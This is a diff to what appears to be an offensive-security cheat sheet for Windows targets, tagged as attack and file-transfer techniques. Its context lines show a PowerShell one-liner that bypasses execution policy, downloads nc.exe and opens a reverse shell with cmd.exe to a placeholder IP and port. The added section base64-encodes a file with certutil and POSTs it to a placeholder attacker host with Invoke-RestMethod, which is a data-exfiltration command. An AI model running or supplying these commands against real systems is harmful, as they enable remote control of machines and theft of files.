@@ -13,3 +13,11 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-
 ```powershell
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile New-Object System.Net.WebClient.DownloadFile('<url_file>','nc.exe'); nc.exe <ip> <port> -e cmd.exe
 ```
+
+
+## Upload with powershell
+#plateform/windows #target/remote #cat/ATTACK/FILE_TRANSFERT #cat/ATTACK/EXPLOIT 
+certutil -encode <infile> <outfile>
+```powershell
+$base64str = Get-Content <b64-file> && Invoke-RestMethod -Uri http://<ip>:<port>/ -Method POST -Body $base64str
+```
